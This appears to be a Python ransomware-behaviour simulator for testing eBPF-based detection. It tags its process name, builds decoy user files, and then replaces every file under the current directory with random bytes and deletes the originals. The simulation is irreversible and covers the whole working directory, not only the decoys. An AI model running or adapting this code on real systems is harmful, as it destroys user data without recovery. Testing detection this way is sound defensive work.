#!/usr/bin/env python3
import argparse
import ctypes
import ctypes.util
import os
from pathlib import Path


def set_comm(name: bytes):
    """Set the kernel comm (task name) so eBPF sees a custom process name."""
    libc_path = ctypes.util.find_library("c")
    if not libc_path:
        raise RuntimeError("Could not locate libc")
    libc = ctypes.CDLL(libc_path, use_errno=True)
    PR_SET_NAME = 15
    if libc.prctl(PR_SET_NAME, name, 0, 0, 0) != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


TREE_LAYOUT = {
    "Documents": [
        "report_q3.docx",
        "budget_2026.xlsx",
        "meeting_notes.txt",
        "invoice_042.pdf",
        "roadmap.md",
    ],
    "Pictures": [
        "photo_001.jpg",
        "vacation_2025.jpeg",
        "banner.png",
        "logo.svg",
        "screenshot_01.png",
    ],
    "Desktop": [
        "todo.txt",
        "draft_letter.docx",
        "notes.rtf",
        "presentation.pptx",
        "bookmarks.csv",
    ],
    "Projects": [
        "app.py",
        "module.js",
        "build.c",
        "design_spec.txt",
        "report_final.pdf",
    ],
}


def human_text(directory: str, filename: str) -> str:
    line = (
        f"Confidential working copy for {directory}/{filename}. "
        "Keep this file readable and human-authored. "
        "This simulation is building realistic user documents for ransomware testing.\n"
    )
    return (line * 12)[:1024]


def build_tree() -> int:
    created = 0
    for directory, filenames in TREE_LAYOUT.items():
        dir_path = Path(directory)
        dir_path.mkdir(parents=True, exist_ok=True)
        for filename in filenames:
            path = dir_path / filename
            path.write_text(human_text(directory, filename), encoding="utf-8")
            created += 1
    return created


def encrypt_and_delete() -> int:
    processed = 0
    for root, _, filenames in os.walk(".", topdown=True):
        for filename in list(filenames):
            if filename.endswith(".locked"):
                continue
            src = Path(root) / filename
            content = src.read_bytes()
            dest = src.with_name(src.name + ".locked")
            dest.write_bytes(os.urandom(len(content)))
            src.unlink()
            processed += 1
    return processed


def main() -> int:
    parser = argparse.ArgumentParser(description="Encrypt-then-delete ransomware behavior simulator")
    parser.parse_args()

    set_comm(b"ransim_del")
    build_tree()
    processed = encrypt_and_delete()
    print(f"ransim_del encrypted and deleted {processed} files")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
